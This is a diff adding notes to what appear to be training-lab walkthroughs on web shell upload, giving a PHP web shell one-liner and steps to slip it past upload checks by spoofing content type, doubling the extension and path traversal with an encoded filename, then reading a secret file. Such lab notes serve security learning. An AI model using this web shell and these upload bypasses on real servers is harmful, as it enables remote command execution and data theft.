@@ -8,3 +8,8 @@ Login -> Create a php file `<?php echo system($_GET['command']); ?>` -> Name it 
 Login -> Create a php file `<?php echo system($_GET['command']); ?>` -> Name it anything (e.g shell.php) -> Upload that file -> capture that request -> Change Content-type to image/png and also change the filename from shell.php to shell.png.php -> send -> see the response in browser, its uploaded -> follow previous method
 
 
+# Lab: Web shell upload via path traversal
+
+Login -> Create a php file `<?php echo system($_GET['command']); ?>` -> Name it anything (e.g shell.php) -> Upload that file -> capture that request -> Change the filename to `..%2fshell.php` -> send -> Its uploaded -> Now go back to my-account -> Right click the image and view it in a new tab -> In url change /files/avatars/..%2fshell.php to /files/avatars/../shell.php ->send -> now get the answer using `/files/avatars/../shell.php?command=cat /home/carlos/secret`
+
+# 
